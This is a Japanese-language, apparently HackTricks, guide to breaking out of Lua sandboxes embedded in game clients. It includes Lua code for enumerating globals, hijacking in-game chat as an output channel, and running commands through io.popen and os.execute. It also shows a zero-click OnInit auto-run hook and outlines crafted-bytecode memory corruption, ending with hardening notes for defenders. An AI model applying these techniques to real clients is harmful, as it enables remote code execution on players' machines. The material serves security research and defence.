# Lua サンドボックス（embedded VM、game client）を bypass する

このページでは、アプリケーション（特に game client、plugin、または in-app scripting engine）に埋め込まれた Lua の「サンドボックス」を列挙し、break out するための実践的な techniques をまとめます。多くの engine は制限された Lua 環境を公開しますが、arbitrary command execution を可能にする強力な global や、bytecode loader が公開されている場合には native memory corruption さえ可能にする機能へ到達できる状態を残しています。

主な考え方：
- VM を未知の環境として扱い、_G を列挙して、到達可能な危険な primitive を見つける。
- stdout/print が block されている場合は、VM 内の UI/IPC channel を output sink として悪用し、結果を確認する。
- io/os が公開されている場合、多くの場合、直接 command execution（io.popen、os.execute）が可能になる。
- load/loadstring/loadfile が公開されている場合、細工した Lua bytecode を実行することで、一部の version では memory safety を subvert できる（≤5.1 の verifier は bypass 可能、5.2 では verifier が削除された）。これにより advanced exploitation が可能になる。

## sandboxed environment を列挙する

- global environment を dump して、到達可能な table/function を一覧化する：
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print() が利用できない場合は、VM 内のチャネルを転用します。サウンド呼び出しの後でのみチャット出力が機能する MMO のハウジングスクリプト VM の例では、以下によって信頼性の高い出力関数を構築できます。<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
このパターンを対象に一般化してください。文字列を受け付ける textbox、toast、logger、または UI callback は、偵察における stdout として機能します。

## io/os が公開されている場合の直接的な command execution

sandbox が標準ライブラリの io または os を引き続き公開している場合、すぐに command execution が可能になるでしょう：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- 実行はクライアントプロセス内で行われるため、外部デバッガをブロックする多くのアンチチート/アンチデバッグ層では、VM内でのプロセス作成を防げません。
- 次の項目も確認してください: package.loadlib（任意の DLL/.so のロード）、ネイティブモジュールを使用した require、LuaJIT の ffi（存在する場合）、および debug ライブラリ（VM 内で権限を昇格できる可能性があります）。

## auto-run callbacks 経由のゼロクリックトリガー

ホストアプリケーションがクライアントにスクリプトをプッシュし、VM が auto-run フック（例: OnInit/OnLoad/OnEnter）を公開している場合は、スクリプトのロード直後にドライブバイ侵害を実行できるよう、そこに payload を配置します:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
同等の callback（OnLoad、OnEnter など）があれば、scripts が client に自動的に送信・実行される場合にもこの technique を一般化できます。

## recon 中に探すべき危険なプリミティブ

_G の列挙中は、特に以下を探します:
- io、os: io.popen、os.execute、file I/O、env access。
- load、loadstring、loadfile、dofile: source または bytecode を実行します。信頼できない bytecode のロードをサポートします。
- package、package.loadlib、require: dynamic library のロードと module surface。
- debug: setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo、および hooks。
- LuaJIT-only: ffi.cdef、ffi.load により native code を直接呼び出します。

最小限の使用例（到達可能な場合）:

Lua の loader API はバージョンによって変更されています。Lua 5.1 では、`load` は reader function から読み取り、`loadstring` は string から読み取ります。Lua 5.2 の `load` は string または reader function のいずれかを受け入れ、`loadstring` は同等の機能として deprecated です。<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: Lua bytecode loadersの悪用

load/loadstring/loadfileにアクセス可能だが、io/osが制限されている場合、細工したLua bytecodeを実行することで、メモリ開示やメモリ破壊のプリミティブにつながる可能性があります。主なポイント:
- Lua ≤ 5.1には、既知のbypassが存在するbytecode verifierが同梱されていました。<sup>[[4]](#references)</sup>
- Lua 5.2ではverifierが完全に削除されました（公式見解: アプリケーション側でprecompiled chunksを拒否すべき）。そのため、bytecode loadingが禁止されていない場合、attack surfaceが拡大します。<sup>[[2]](#references)[[3]](#references)</sup>
- 一般的なworkflowは、VM内の出力を介してポインタをleakし、type confusionを発生させるbytecode（FORLOOPなどのopcode周辺）を作成し、その後arbitrary read/writeまたはnative code executionへpivotするというものです。<sup>[[2]](#references)[[4]](#references)</sup>

この経路はengine/version固有であり、REが必要です。詳細な分析、exploitation primitives、ゲームにおけるexample gadgetryについてはreferencesを参照してください。

## Detection and hardening notes (for defenders)

- Server side: user scriptsをrejectまたはrewriteし、安全なAPIをallowlist化する。io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffiをstripするか、空のbindingにする。
- Client side: 最小限の_ENVでLuaを実行し、bytecode loadingを禁止する。strictなbytecode verifierまたはsignature checksを再導入し、client processからのprocess creationをblockする。
- Telemetry: script load直後に発生したgameclient → child process creationをalertし、UI/chat/script eventsとcorrelateする。

## References

- [1] [This House is Haunted: AION client（housing Lua VM）における10年前のRCE](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: FactorioのLua Security Flawsを解明する](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): bytecode verifierの削除に関するDiscussion](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode（verifier bypasses/notes付きgist）](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
